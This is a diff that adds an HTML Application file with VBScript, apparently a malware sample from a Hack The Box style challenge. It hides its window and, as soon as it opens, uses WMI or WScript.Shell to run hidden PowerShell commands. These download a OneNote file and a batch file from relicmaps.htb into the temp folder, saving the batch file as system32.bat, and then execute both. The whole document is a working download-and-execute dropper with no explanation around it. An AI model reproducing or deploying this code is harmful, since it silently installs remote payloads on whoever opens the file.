@@ -1,0 +1,61 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<HTA:APPLICATION icon="#" WINDOWSTATE="normal" SHOWINTASKBAR="no" SYSMENU="no"  CAPTION="no" BORDER="none" SCROLL="no" />
+<script type="text/vbscript">
+
+' Exec process using WMI
+Function WmiExec(cmdLine ) 
+    Dim objConfig 
+    Dim objProcess 
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+    Set objConfig = objStartup.SpawnInstance_
+    objConfig.ShowWindow = 0
+    Set objProcess = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
+    WmiExec = dukpatek(objProcess, objConfig, cmdLine)
+End Function
+
+
+Private Function dukpatek(myObjP , myObjC , myCmdL ) 
+    Dim procId 
+    dukpatek = myObjP.Create(myCmdL, Null, myObjC, procId)
+End Function
+
+
+
+Sub AutoOpen()
+    ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/uploads/soft/topsecret-maps.one -OutFile $env:tmp\tsmap.one; Start-Process -Filepath $env:tmp\tsmap.one"
+	    ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/get/DdAbds/window.bat -OutFile $env:tmp\system32.bat; Start-Process -Filepath $env:tmp\system32.bat"
+End Sub
+
+
+
+
+' Exec process using WScript.Shell (asynchronous)
+Sub WscriptExec(cmdLine )
+    CreateObject("WScript.Shell").Run cmdLine, 0
+End Sub
+
+
+Sub ExecuteCmdAsync(targetPath )
+    On Error Resume Next
+    Err.Clear
+    wimResult = WmiExec(targetPath)
+    If Err.Number <> 0 Or wimResult <> 0 Then
+        Err.Clear
+        WscriptExec targetPath
+    End If
+    On Error Goto 0
+End Sub
+
+
+window.resizeTo 0,0
+AutoOpen
+Close
+</script>
+</head>
+<body>
+</body>
+</html>
